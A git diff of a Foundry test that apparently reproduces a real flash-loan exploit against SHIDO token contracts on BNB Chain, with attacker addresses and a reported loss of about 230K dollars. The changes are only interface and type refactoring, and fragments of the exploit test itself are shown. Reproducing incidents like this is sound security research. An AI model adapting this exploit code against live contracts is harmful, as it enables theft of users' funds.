@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
+import {IWETH} from "src/interfaces/IWETH.sol";
+
 // @KeyInfo - Total Lost : ~230K US$
 // Attacker : https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d
 // Attack Contract : https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc
@@ -42,8 +48,8 @@ contract ContractTest is Test {
 
     IERC20 SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
     IERC20 SHIDOINU = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
-    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IWETH WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IFeeFreeRouter FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
     IShidoLock ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
     address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
@@ -61,7 +67,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        DVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
